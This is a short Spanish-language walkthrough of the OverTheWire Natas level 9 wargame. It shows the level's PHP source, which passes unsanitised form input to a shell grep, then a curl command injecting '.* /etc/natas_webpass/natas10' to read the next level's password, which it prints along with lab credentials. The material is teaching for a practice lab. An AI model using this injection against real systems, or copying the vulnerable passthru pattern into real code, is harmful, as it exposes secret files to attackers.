
Para resolver este nivel primero debemos inspeccionar el código fuente para revisar cuales son las variables del formulario y que debemos hacer
``` php
<form>  
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>  
</form>  
  
  
Output:  
<pre>  
<?  
$key = "";  
  
if(array_key_exists("needle", $_REQUEST)) {    
	$key = $_REQUEST["needle"];  
}  
  
if($key != "") {    
	passthru("grep -i $key dictionary.txt");  
}  
?>  
</pre>
```
Primero nos damos cuenta que hay una variable `$key`,  como el código no limpia caracteres de ninguna forma y si ponemos la ruta de contraseñas con un . antes para que busque en absolutamente todos los archivos en le valor `$key`, el código estaría haciendo un grep en esa ruta y en el diccionario que ya trae incorporado, después de eso, solo nos queda hacer un grep a parte que nos filtre la palabra natas10, entonces solo nos quedaría hacer un post con los valores ya definidos
``` zsh
curl -s -u natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t -d "needle=.* /etc/natas_webpass/natas10&submit=Search" http://natas9.natas.labs.overthewire.org | grep "natas10"

```
 y nos imprime este resultado
``` zsh
/etc/natas_webpass/natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
```

